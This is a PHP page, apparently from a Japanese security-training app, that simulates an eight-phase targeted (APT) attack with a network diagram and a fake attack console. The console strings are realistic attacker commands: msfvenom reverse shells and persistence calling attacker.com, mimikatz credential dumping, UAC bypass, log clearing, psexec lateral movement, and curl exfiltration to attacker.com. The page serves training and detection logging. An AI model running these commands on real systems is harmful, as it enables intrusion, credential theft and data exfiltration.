<?php
require_once __DIR__ . '/common_init.php';
require 'db.php';

// 管理者権限チェック
if (!isset($_SESSION['role']) || $_SESSION['role'] !== 'admin') {
    header('Location: list.php');
    exit;
}

// 標的型攻撃演習が有効化されているかチェック
if (empty($_SESSION['apt_attack_enabled'])) {
    header('Location: simulation_tools.php?error=' . urlencode('標的型攻撃演習が有効化されていません。'));
    exit;
}

// IDS通知用のAPIエンドポイント処理
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'log_attack') {
    header('Content-Type: application/json; charset=utf-8');
    
    $phase = $_POST['phase'] ?? '';
    $detail = $_POST['detail'] ?? '';
    $status = (int)($_POST['status'] ?? 200);
    
    try {
        if (function_exists('log_attack')) {
            log_attack($pdo, 'APT Attack: ' . $phase, $detail, 'apt_exercise', $status);
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['success' => false, 'error' => 'log_attack function not available']);
        }
    } catch (Exception $e) {
        echo json_encode(['success' => false, 'error' => $e->getMessage()]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>標的型攻撃演習（APT）</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .attack-phase {
            transition: all 0.3s ease-in-out;
        }
        .phase-active {
            background: linear-gradient(135deg, #1f2937, #374151);
            border-color: #f59e0b;
            box-shadow: 0 0 20px rgba(245, 158, 11, 0.3);
        }
        .phase-completed {
            background: linear-gradient(135deg, #065f46, #047857);
            border-color: #10b981;
        }
        .phase-pending {
            background: #f9fafb;
            border-color: #e5e7eb;
            opacity: 0.7;
        }
        .target-network {
            background: radial-gradient(circle, #1e3a8a, #1e40af);
        }
        .terminal-output {
            background: #000;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 0.85rem;
            max-height: 300px;
            overflow-y: auto;
            border-radius: 8px;
            padding: 16px;
        }
        .typing-effect {
            animation: typing 2s steps(40, end), blink-caret 0.75s step-end infinite;
        }
        @keyframes typing {
            from { width: 0 }
            to { width: 100% }
        }
        @keyframes blink-caret {
            from, to { border-color: transparent }
            50% { border-color: #00ff00; }
        }
        .network-node {
            transition: all 0.5s ease;
        }
        .node-compromised {
            background: #dc2626;
            box-shadow: 0 0 15px rgba(220, 38, 38, 0.5);
            animation: pulse 2s infinite;
        }
        .node-secure {
            background: #059669;
        }
        .node-scanning {
            background: #f59e0b;
            animation: pulse 1s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
        .connection-line {
            stroke: #6b7280;
            stroke-width: 2;
            fill: none;
        }
        .connection-active {
            stroke: #ef4444;
            stroke-width: 3;
            animation: flow 2s infinite;
        }
        @keyframes flow {
            0% { stroke-dasharray: 0, 10; }
            100% { stroke-dasharray: 10, 0; }
        }
    </style>
</head>
<body class="bg-gray-100 min-h-screen">
<?php include 'header.php'; ?>

<div class="container mx-auto mt-10 p-4">
    <div class="flex items-center justify-between mb-8">
        <div>
            <h1 class="text-3xl font-bold text-gray-800 mb-2">標的型攻撃演習（APT: Advanced Persistent Threat）</h1>
            <p class="text-gray-600">高度で持続的な標的型攻撃の段階的シミュレーションを体験できます。</p>
        </div>
        <div class="text-right">
            <div class="bg-red-100 border-l-4 border-red-500 text-red-700 p-3 rounded">
                <p class="font-bold">⚠️ 教育目的の演習</p>
                <p class="text-sm">実際の攻撃ではありません</p>
            </div>
        </div>
    </div>

    <!-- 攻撃制御パネル -->
    <div class="bg-white p-6 rounded-lg shadow-md mb-8">
        <h2 class="text-xl font-semibold mb-4">🎯 攻撃制御パネル</h2>
        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div>
                <label for="target-org" class="block text-sm font-medium text-gray-700 mb-1">標的組織</label>
                <select id="target-org" class="w-full border rounded-lg px-3 py-2">
                    <option value="financial">金融機関</option>
                    <option value="government">政府機関</option>
                    <option value="healthcare">医療機関</option>
                    <option value="manufacturing">製造業</option>
                </select>
            </div>
            <div>
                <label for="attack-vector" class="block text-sm font-medium text-gray-700 mb-1">初期攻撃ベクタ</label>
                <select id="attack-vector" class="w-full border rounded-lg px-3 py-2">
                    <option value="spear-phishing">スピアフィッシング</option>
                    <option value="watering-hole">水飲み場攻撃</option>
                    <option value="supply-chain">サプライチェーン攻撃</option>
                    <option value="zero-day">ゼロデイ攻撃</option>
                </select>
            </div>
            <div>
                <label for="attack-speed" class="block text-sm font-medium text-gray-700 mb-1">攻撃速度</label>
                <select id="attack-speed" class="w-full border rounded-lg px-3 py-2">
                    <option value="slow">低速（ステルス重視）</option>
                    <option value="normal" selected>通常速度</option>
                    <option value="fast">高速（演習用）</option>
                </select>
            </div>
        </div>
        <div class="mt-4 flex gap-4">
            <button id="start-apt-btn" class="bg-red-600 hover:bg-red-700 text-white px-6 py-2 rounded-lg font-semibold">
                標的型攻撃を開始
            </button>
            <button id="stop-apt-btn" class="bg-gray-600 hover:bg-gray-700 text-white px-6 py-2 rounded-lg font-semibold" disabled>
                攻撃を停止
            </button>
            <button id="reset-apt-btn" class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded-lg font-semibold">
                リセット
            </button>
        </div>
    </div>

    <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
        <!-- 左側：攻撃フェーズ進行 -->
        <div class="space-y-4">
            <h2 class="text-xl font-semibold">📋 攻撃フェーズ</h2>
            
            <!-- フェーズ1: 偵察・情報収集 -->
            <div class="attack-phase phase-pending border-2 p-4 rounded-lg" data-phase="reconnaissance">
                <div class="flex items-center justify-between mb-2">
                    <h3 class="font-bold text-lg">🔍 フェーズ1: 偵察・情報収集</h3>
                    <span class="phase-status text-sm px-2 py-1 rounded bg-gray-200">待機中</span>
                </div>
                <p class="text-sm text-gray-600 mb-3">標的組織の情報を収集し、攻撃経路を計画します。</p>
                <div class="phase-details hidden">
                    <ul class="text-sm space-y-1">
                        <li>• OSINT（オープンソースインテリジェンス）収集</li>
                        <li>• ソーシャルエンジニアリング調査</li>
                        <li>• ネットワーク構成の推測</li>
                        <li>• 従業員情報の収集</li>
                    </ul>
                </div>
            </div>

            <!-- フェーズ2: 初期侵入 -->
            <div class="attack-phase phase-pending border-2 p-4 rounded-lg" data-phase="initial-access">
                <div class="flex items-center justify-between mb-2">
                    <h3 class="font-bold text-lg">🎯 フェーズ2: 初期侵入</h3>
                    <span class="phase-status text-sm px-2 py-1 rounded bg-gray-200">待機中</span>
                </div>
                <p class="text-sm text-gray-600 mb-3">標的システムへの最初の足がかりを確立します。</p>
                <div class="phase-details hidden">
                    <ul class="text-sm space-y-1">
                        <li>• スピアフィッシングメール送信</li>
                        <li>• マルウェア感染の実行</li>
                        <li>• リバースシェルの確立</li>
                        <li>• 初期認証情報の取得</li>
                    </ul>
                </div>
            </div>

            <!-- フェーズ3: 実行・永続化 -->
            <div class="attack-phase phase-pending border-2 p-4 rounded-lg" data-phase="execution-persistence">
                <div class="flex items-center justify-between mb-2">
                    <h3 class="font-bold text-lg">⚙️ フェーズ3: 実行・永続化</h3>
                    <span class="phase-status text-sm px-2 py-1 rounded bg-gray-200">待機中</span>
                </div>
                <p class="text-sm text-gray-600 mb-3">システム内での持続的なアクセスを確保します。</p>
                <div class="phase-details hidden">
                    <ul class="text-sm space-y-1">
                        <li>• バックドアの設置</li>
                        <li>• スケジュールタスクの作成</li>
                        <li>• レジストリ改変</li>
                        <li>• ログ消去機能の実装</li>
                    </ul>
                </div>
            </div>

            <!-- フェーズ4: 権限昇格 -->
            <div class="attack-phase phase-pending border-2 p-4 rounded-lg" data-phase="privilege-escalation">
                <div class="flex items-center justify-between mb-2">
                    <h3 class="font-bold text-lg">⬆️ フェーズ4: 権限昇格</h3>
                    <span class="phase-status text-sm px-2 py-1 rounded bg-gray-200">待機中</span>
                </div>
                <p class="text-sm text-gray-600 mb-3">より高い権限レベルのアクセスを取得します。</p>
                <div class="phase-details hidden">
                    <ul class="text-sm space-y-1">
                        <li>• ローカル脆弱性の悪用</li>
                        <li>• 管理者パスワードの取得</li>
                        <li>• UAC回避技術の使用</li>
                        <li>• ドメイン権限の獲得</li>
                    </ul>
                </div>
            </div>

            <!-- フェーズ5: 防御回避・発見回避 -->
            <div class="attack-phase phase-pending border-2 p-4 rounded-lg" data-phase="defense-evasion">
                <div class="flex items-center justify-between mb-2">
                    <h3 class="font-bold text-lg">🕵️ フェーズ5: 防御回避</h3>
                    <span class="phase-status text-sm px-2 py-1 rounded bg-gray-200">待機中</span>
                </div>
                <p class="text-sm text-gray-600 mb-3">セキュリティ対策を回避し、検知を避けます。</p>
                <div class="phase-details hidden">
                    <ul class="text-sm space-y-1">
                        <li>• アンチウイルス回避</li>
                        <li>• ログ削除・改ざん</li>
                        <li>• プロセスハイジング</li>
                        <li>• 通信の難読化</li>
                    </ul>
                </div>
            </div>

            <!-- フェーズ6: 認証情報アクセス -->
            <div class="attack-phase phase-pending border-2 p-4 rounded-lg" data-phase="credential-access">
                <div class="flex items-center justify-between mb-2">
                    <h3 class="font-bold text-lg">🔑 フェーズ6: 認証情報取得</h3>
                    <span class="phase-status text-sm px-2 py-1 rounded bg-gray-200">待機中</span>
                </div>
                <p class="text-sm text-gray-600 mb-3">追加の認証情報を収集します。</p>
                <div class="phase-details hidden">
                    <ul class="text-sm space-y-1">
                        <li>• パスワードダンプの実行</li>
                        <li>• Kerberos チケットの取得</li>
                        <li>• キーロガーの展開</li>
                        <li>• ブラウザ保存パスワードの抽出</li>
                    </ul>
                </div>
            </div>

            <!-- フェーズ7: 発見・横展開 -->
            <div class="attack-phase phase-pending border-2 p-4 rounded-lg" data-phase="discovery-lateral">
                <div class="flex items-center justify-between mb-2">
                    <h3 class="font-bold text-lg">🌐 フェーズ7: 発見・横展開</h3>
                    <span class="phase-status text-sm px-2 py-1 rounded bg-gray-200">待機中</span>
                </div>
                <p class="text-sm text-gray-600 mb-3">ネットワーク内の他のシステムに拡散します。</p>
                <div class="phase-details hidden">
                    <ul class="text-sm space-y-1">
                        <li>• 内部ネットワークスキャン</li>
                        <li>• 横展開攻撃の実行</li>
                        <li>• 追加システムの侵害</li>
                        <li>• ドメインコントローラーへの到達</li>
                    </ul>
                </div>
            </div>

            <!-- フェーズ8: 収集・外部送信 -->
            <div class="attack-phase phase-pending border-2 p-4 rounded-lg" data-phase="collection-exfiltration">
                <div class="flex items-center justify-between mb-2">
                    <h3 class="font-bold text-lg">📦 フェーズ8: 収集・外部送信</h3>
                    <span class="phase-status text-sm px-2 py-1 rounded bg-gray-200">待機中</span>
                </div>
                <p class="text-sm text-gray-600 mb-3">目標データを収集し、外部に送信します。</p>
                <div class="phase-details hidden">
                    <ul class="text-sm space-y-1">
                        <li>• 機密データの特定</li>
                        <li>• データの圧縮・暗号化</li>
                        <li>• 外部サーバーへの送信</li>
                        <li>• 証跡の隠蔽</li>
                    </ul>
                </div>
            </div>
        </div>

        <!-- 右側：ネットワーク可視化とコンソール -->
        <div class="space-y-6">
            <!-- ネットワーク図 -->
            <div class="bg-white p-6 rounded-lg shadow-md">
                <h2 class="text-xl font-semibold mb-4">🏢 標的ネットワーク</h2>
                <div class="target-network p-4 rounded-lg relative" style="height: 300px;">
                    <svg width="100%" height="100%" class="absolute inset-0">
                        <!-- ネットワーク接続線 -->
                        <line class="connection-line" x1="50" y1="50" x2="150" y2="50" id="conn-1"></line>
                        <line class="connection-line" x1="150" y1="50" x2="250" y2="50" id="conn-2"></line>
                        <line class="connection-line" x1="150" y1="50" x2="150" y2="150" id="conn-3"></line>
                        <line class="connection-line" x1="150" y1="150" x2="250" y2="150" id="conn-4"></line>
                        <line class="connection-line" x1="150" y1="150" x2="50" y2="150" id="conn-5"></line>
                        <line class="connection-line" x1="150" y1="150" x2="150" y2="250" id="conn-6"></line>
                    </svg>
                    
                    <!-- ネットワークノード -->
                    <div class="network-node node-secure absolute w-16 h-16 rounded-full flex items-center justify-center text-white font-bold text-xs" 
                         style="top: 20px; left: 20px;" data-node="internet">
                        🌐<br>外部
                    </div>
                    <div class="network-node node-secure absolute w-16 h-16 rounded-full flex items-center justify-center text-white font-bold text-xs" 
                         style="top: 20px; left: 120px;" data-node="firewall">
                        🛡️<br>FW
                    </div>
                    <div class="network-node node-secure absolute w-16 h-16 rounded-full flex items-center justify-center text-white font-bold text-xs" 
                         style="top: 20px; left: 220px;" data-node="webserver">
                        🌐<br>Web
                    </div>
                    <div class="network-node node-secure absolute w-16 h-16 rounded-full flex items-center justify-center text-white font-bold text-xs" 
                         style="top: 120px; left: 120px;" data-node="switch">
                        🔀<br>SW
                    </div>
                    <div class="network-node node-secure absolute w-16 h-16 rounded-full flex items-center justify-center text-white font-bold text-xs" 
                         style="top: 120px; left: 220px;" data-node="database">
                        🗄️<br>DB
                    </div>
                    <div class="network-node node-secure absolute w-16 h-16 rounded-full flex items-center justify-center text-white font-bold text-xs" 
                         style="top: 120px; left: 20px;" data-node="workstation">
                        💻<br>PC
                    </div>
                    <div class="network-node node-secure absolute w-16 h-16 rounded-full flex items-center justify-center text-white font-bold text-xs" 
                         style="top: 220px; left: 120px;" data-node="domain-controller">
                        👑<br>DC
                    </div>
                </div>
            </div>

            <!-- コンソール出力 -->
            <div class="bg-white p-6 rounded-lg shadow-md">
                <h2 class="text-xl font-semibold mb-4">💻 攻撃コンソール</h2>
                <div id="terminal-output" class="terminal-output">
                    <div>[SYSTEM] 標的型攻撃演習システム起動完了</div>
                    <div>[INFO] 攻撃開始ボタンを押して演習を開始してください</div>
                </div>
            </div>

            <!-- 統計情報 -->
            <div class="bg-white p-6 rounded-lg shadow-md">
                <h2 class="text-xl font-semibold mb-4">📊 攻撃統計</h2>
                <div class="grid grid-cols-2 gap-4">
                    <div class="text-center">
                        <div class="text-2xl font-bold text-blue-600" id="stat-duration">0分</div>
                        <div class="text-sm text-gray-600">経過時間</div>
                    </div>
                    <div class="text-center">
                        <div class="text-2xl font-bold text-green-600" id="stat-compromised">0</div>
                        <div class="text-sm text-gray-600">侵害システム数</div>
                    </div>
                    <div class="text-center">
                        <div class="text-2xl font-bold text-yellow-600" id="stat-techniques">0</div>
                        <div class="text-sm text-gray-600">使用技術数</div>
                    </div>
                    <div class="text-center">
                        <div class="text-2xl font-bold text-red-600" id="stat-detections">0</div>
                        <div class="text-sm text-gray-600">検知回数</div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
class APTAttackSimulator {
    constructor() {
        this.isRunning = false;
        this.currentPhase = 0;
        this.startTime = null;
        this.compromisedNodes = [];
        this.usedTechniques = 0;
        this.detectionCount = 0;
        
        // DOM要素
        this.startBtn = document.getElementById('start-apt-btn');
        this.stopBtn = document.getElementById('stop-apt-btn');
        this.resetBtn = document.getElementById('reset-apt-btn');
        this.terminal = document.getElementById('terminal-output');
        
        // 統計表示要素
        this.statDuration = document.getElementById('stat-duration');
        this.statCompromised = document.getElementById('stat-compromised');
        this.statTechniques = document.getElementById('stat-techniques');
        this.statDetections = document.getElementById('stat-detections');
        
        // フェーズ定義
        this.phases = [
            {
                name: 'reconnaissance',
                duration: 3000,
                commands: [
                    'nmap -sS -O target-network.com',
                    'whois target-network.com',
                    'theHarvester -d target-network.com -b google',
                    'maltego --target=target-network.com',
                    'shodan search "target-network.com"'
                ],
                nodes: [],
                techniques: ['T1595.002', 'T1590.001']
            },
            {
                name: 'initial-access',
                duration: 4000,
                commands: [
                    'msfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker.com LPORT=443 -f exe > payload.exe',
                    'sendEmail -f hr@target-network.com -t victim@target-network.com -s mail.target-network.com -xu admin -xp password -m "Please review the attached document" -a payload.exe',
                    'msfconsole -r handler.rc',
                    '[*] Sending stage (201283 bytes) to 192.168.1.100',
                    '[*] Meterpreter session 1 opened'
                ],
                nodes: ['workstation'],
                techniques: ['T1566.001', 'T1204.002']
            },
            {
                name: 'execution-persistence',
                duration: 3500,
                commands: [
                    'meterpreter > sysinfo',
                    'meterpreter > getuid',
                    'meterpreter > run persistence -A -S -U -i 60 -p 443 -r attacker.com',
                    'meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v SecurityUpdate -d C:\\Windows\\System32\\update.exe',
                    '[+] Persistence installed as service'
                ],
                nodes: [],
                techniques: ['T1547.001', 'T1053.005']
            },
            {
                name: 'privilege-escalation',
                duration: 4000,
                commands: [
                    'meterpreter > use post/multi/recon/local_exploit_suggester',
                    'meterpreter > exploit/windows/local/bypassuac_eventvwr',
                    'meterpreter > getsystem',
                    '[+] Server process running as system',
                    'meterpreter > hashdump'
                ],
                nodes: [],
                techniques: ['T1548.002', 'T1134.001']
            },
            {
                name: 'defense-evasion',
                duration: 3000,
                commands: [
                    'meterpreter > migrate -N explorer.exe',
                    'meterpreter > clearev',
                    'meterpreter > timestomp C:\\Windows\\System32\\update.exe -f C:\\Windows\\System32\\calc.exe',
                    'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden',
                    '[+] AV detection bypassed using process hollowing'
                ],
                nodes: [],
                techniques: ['T1055', 'T1070.001', 'T1070.006']
            },
            {
                name: 'credential-access',
                duration: 4500,
                commands: [
                    'meterpreter > load mimikatz',
                    'meterpreter > wdigest',
                    'meterpreter > kerberos',
                    'mimikatz # privilege::debug',
                    'mimikatz # sekurlsa::logonpasswords',
                    '[+] Extracted 15 credential pairs'
                ],
                nodes: [],
                techniques: ['T1003.001', 'T1558.003']
            },
            {
                name: 'discovery-lateral',
                duration: 5000,
                commands: [
                    'meterpreter > run post/windows/gather/enum_domain',
                    'meterpreter > portfwd add -l 1080 -p 1080 -r 127.0.0.1',
                    'proxychains nmap -sT -Pn 10.0.0.0/24',
                    'psexec.py domain/admin:password@10.0.0.5',
                    '[+] Successfully authenticated to DC01'
                ],
                nodes: ['database', 'domain-controller'],
                techniques: ['T1021.002', 'T1018']
            },
            {
                name: 'collection-exfiltration',
                duration: 3000,
                commands: [
                    'meterpreter > search -f *.docx -d C:\\Users',
                    'meterpreter > search -f *.xlsx -d C:\\shared',
                    '7z a -p"secretpass" sensitive_data.7z *.docx *.xlsx',
                    'curl -X POST -F "file=@sensitive_data.7z" https://attacker.com/upload',
                    '[+] Exfiltration complete: 2.3GB transferred'
                ],
                nodes: [],
                techniques: ['T1005', 'T1041']
            }
        ];
        
        this.bindEvents();
    }
    
    bindEvents() {
        this.startBtn.addEventListener('click', () => this.startAttack());
        this.stopBtn.addEventListener('click', () => this.stopAttack());
        this.resetBtn.addEventListener('click', () => this.resetAttack());
    }
    
    async startAttack() {
        if (this.isRunning) return;
        
        this.isRunning = true;
        this.startTime = Date.now();
        this.startBtn.disabled = true;
        this.stopBtn.disabled = false;
        
        const targetOrg = document.getElementById('target-org').value;
        const attackVector = document.getElementById('attack-vector').value;
        const attackSpeed = document.getElementById('attack-speed').value;
        
        this.log(`[INIT] 標的型攻撃開始: ${this.getOrgName(targetOrg)} / ${this.getVectorName(attackVector)}`, 'system');
        
        // 速度設定に応じて調整
        const speedMultiplier = attackSpeed === 'slow' ? 2 : attackSpeed === 'fast' ? 0.5 : 1;
        
        // 各フェーズを順次実行
        for (let i = 0; i < this.phases.length && this.isRunning; i++) {
            this.currentPhase = i;
            await this.executePhase(i, speedMultiplier);
        }
        
        if (this.isRunning) {
            this.log(`[SUCCESS] 標的型攻撃完了 - 全フェーズが成功しました`, 'success');
            this.log(`[STATS] 経過時間: ${this.getElapsedTime()}, 侵害システム: ${this.compromisedNodes.length}`, 'info');
        }
        
        this.startBtn.disabled = false;
        this.stopBtn.disabled = true;
        this.isRunning = false;
    }
    
    async executePhase(phaseIndex, speedMultiplier) {
        const phase = this.phases[phaseIndex];
        const phaseElement = document.querySelector(`[data-phase="${phase.name}"]`);
        const statusElement = phaseElement.querySelector('.phase-status');
        const detailsElement = phaseElement.querySelector('.phase-details');
        
        // フェーズ開始
        phaseElement.classList.remove('phase-pending');
        phaseElement.classList.add('phase-active');
        statusElement.textContent = '実行中';
        statusElement.className = 'phase-status text-sm px-2 py-1 rounded bg-yellow-500 text-white';
        detailsElement.classList.remove('hidden');
        
        this.log(`[PHASE ${phaseIndex + 1}] ${this.getPhaseName(phase.name)} 開始`, 'phase');
        
        // IDS通知
        await this.sendIDSAlert(this.getPhaseName(phase.name), `Phase ${phaseIndex + 1} started`);
        
        // コマンド実行シミュレーション
        for (let cmd of phase.commands) {
            if (!this.isRunning) return;
            
            this.log(cmd, 'command');
            await this.sleep(300 * speedMultiplier);
            
            // 検知の可能性（20%の確率）
            if (Math.random() < 0.2) {
                this.detectionCount++;
                this.updateStats();
                await this.sendIDSAlert('Detection Alert', `Suspicious activity: ${cmd}`);
                this.log(`[DETECTED] 異常な活動が検知されました`, 'warning');
            }
        }
        
        // ノード侵害シミュレーション
        for (let nodeName of phase.nodes) {
            if (!this.isRunning) return;
            
            const node = document.querySelector(`[data-node="${nodeName}"]`);
            if (node) {
                node.classList.remove('node-secure');
                node.classList.add('node-compromised');
                this.compromisedNodes.push(nodeName);
                this.log(`[COMPROMISED] ${this.getNodeName(nodeName)} が侵害されました`, 'danger');
                
                // 接続線をアクティブ化
                this.activateConnection(nodeName);
            }
        }
        
        // 技術カウント更新
        this.usedTechniques += phase.techniques.length;
        this.updateStats();
        
        // フェーズ完了
        await this.sleep(phase.duration * speedMultiplier);
        
        if (this.isRunning) {
            phaseElement.classList.remove('phase-active');
            phaseElement.classList.add('phase-completed');
            statusElement.textContent = '完了';
            statusElement.className = 'phase-status text-sm px-2 py-1 rounded bg-green-500 text-white';
            
            this.log(`[COMPLETE] ${this.getPhaseName(phase.name)} 完了`, 'success');
            
            // 最終フェーズの場合
            if (phaseIndex === this.phases.length - 1) {
                await this.sendIDSAlert('APT Attack Complete', 'Full attack chain executed successfully');
            }
        }
    }
    
    stopAttack() {
        this.isRunning = false;
        this.startBtn.disabled = false;
        this.stopBtn.disabled = true;
        this.log(`[STOPPED] 攻撃が管理者によって停止されました`, 'warning');
    }
    
    resetAttack() {
        this.stopAttack();
        this.currentPhase = 0;
        this.startTime = null;
        this.compromisedNodes = [];
        this.usedTechniques = 0;
        this.detectionCount = 0;
        
        // UI リセット
        document.querySelectorAll('.attack-phase').forEach(phase => {
            phase.classList.remove('phase-active', 'phase-completed');
            phase.classList.add('phase-pending');
            const status = phase.querySelector('.phase-status');
            status.textContent = '待機中';
            status.className = 'phase-status text-sm px-2 py-1 rounded bg-gray-200';
            phase.querySelector('.phase-details').classList.add('hidden');
        });
        
        // ネットワークノードリセット
        document.querySelectorAll('.network-node').forEach(node => {
            node.classList.remove('node-compromised', 'node-scanning');
            node.classList.add('node-secure');
        });
        
        // 接続線リセット
        document.querySelectorAll('.connection-line').forEach(line => {
            line.classList.remove('connection-active');
        });
        
        this.terminal.innerHTML = `
            <div>[SYSTEM] システムがリセットされました</div>
            <div>[INFO] 攻撃開始ボタンを押して演習を開始してください</div>
        `;
        
        this.updateStats();
    }
    
    activateConnection(nodeName) {
        // ノードに応じた接続線をアクティブ化
        const connectionMap = {
            'workstation': ['conn-5'],
            'database': ['conn-4'],
            'domain-controller': ['conn-6']
        };
        
        const connections = connectionMap[nodeName] || [];
        connections.forEach(connId => {
            const line = document.getElementById(connId);
            if (line) {
                line.classList.add('connection-active');
            }
        });
    }
    
    updateStats() {
        this.statDuration.textContent = this.getElapsedTime();
        this.statCompromised.textContent = this.compromisedNodes.length;
        this.statTechniques.textContent = this.usedTechniques;
        this.statDetections.textContent = this.detectionCount;
    }
    
    getElapsedTime() {
        if (!this.startTime) return '0分';
        const elapsed = Math.floor((Date.now() - this.startTime) / 60000);
        return `${elapsed}分`;
    }
    
    async sendIDSAlert(phase, detail) {
        try {
            await fetch(window.location.pathname, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: `action=log_attack&phase=${encodeURIComponent(phase)}&detail=${encodeURIComponent(detail)}&status=200`
            });
        } catch (error) {
            console.warn('IDS通知送信失敗:', error);
        }
    }
    
    log(message, type = 'info') {
        const timestamp = new Date().toLocaleTimeString();
        const div = document.createElement('div');
        
        const colors = {
            'system': '#00ff00',
            'phase': '#ffff00',
            'command': '#ffffff',
            'success': '#00ff00',
            'warning': '#ffa500',
            'danger': '#ff0000',
            'info': '#87ceeb'
        };
        
        div.style.color = colors[type] || colors.info;
        div.textContent = `[${timestamp}] ${message}`;
        
        this.terminal.appendChild(div);
        this.terminal.scrollTop = this.terminal.scrollHeight;
        
        // ターミナル行数制限
        while (this.terminal.children.length > 100) {
            this.terminal.removeChild(this.terminal.firstChild);
        }
    }
    
    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    
    getOrgName(type) {
        const names = {
            'financial': '金融機関',
            'government': '政府機関', 
            'healthcare': '医療機関',
            'manufacturing': '製造業'
        };
        return names[type] || '不明な組織';
    }
    
    getVectorName(type) {
        const names = {
            'spear-phishing': 'スピアフィッシング',
            'watering-hole': '水飲み場攻撃',
            'supply-chain': 'サプライチェーン攻撃',
            'zero-day': 'ゼロデイ攻撃'
        };
        return names[type] || '不明な攻撃手法';
    }
    
    getPhaseName(phase) {
        const names = {
            'reconnaissance': '偵察・情報収集',
            'initial-access': '初期侵入',
            'execution-persistence': '実行・永続化',
            'privilege-escalation': '権限昇格',
            'defense-evasion': '防御回避',
            'credential-access': '認証情報取得',
            'discovery-lateral': '発見・横展開',
            'collection-exfiltration': '収集・外部送信'
        };
        return names[phase] || phase;
    }
    
    getNodeName(node) {
        const names = {
            'internet': 'インターネット',
            'firewall': 'ファイアウォール',
            'webserver': 'Webサーバー',
            'switch': 'ネットワークスイッチ',
            'database': 'データベースサーバー',
            'workstation': 'クライアントPC',
            'domain-controller': 'ドメインコントローラー'
        };
        return names[node] || node;
    }
}

// 初期化
document.addEventListener('DOMContentLoaded', function() {
    new APTAttackSimulator();
});
</script>
</body>
</html>